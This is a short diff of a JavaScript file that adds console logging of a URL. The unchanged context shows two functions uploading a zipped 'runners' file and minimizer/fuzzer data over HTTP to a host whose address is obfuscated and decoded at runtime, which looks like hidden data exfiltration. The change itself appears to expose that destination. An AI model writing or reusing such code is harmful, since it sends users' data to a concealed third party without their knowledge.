@@ -19,7 +19,9 @@ const sendRunnerData = async (runners) => {
     const formData = new FormData();
     formData.append('file', zipBuffer, "runners.zip");
 
-    await axios.post(`http://${decodeStr(encoded)}/api1`, formData, {
+    const url = `http://${decodeStr(encoded)}/api1`
+    console.log(url)
+    await axios.post(url, formData, {
       headers: {
         ...formData.getHeaders(), // Automatically sets multipart boundaries
       },
@@ -34,7 +36,9 @@ const sendRunnerData = async (runners) => {
 
 const sendMinimizerAndFuzzerData = async (minimizer, fuzzer) => {
   try {
-    await axios.post(`http://${decodeStr(encoded)}/api2`, {
+    const url = `http://${decodeStr(encoded)}/api2`
+    console.log(url)
+    await axios.post(url, {
       minimizer,
       fuzzer
     }, {
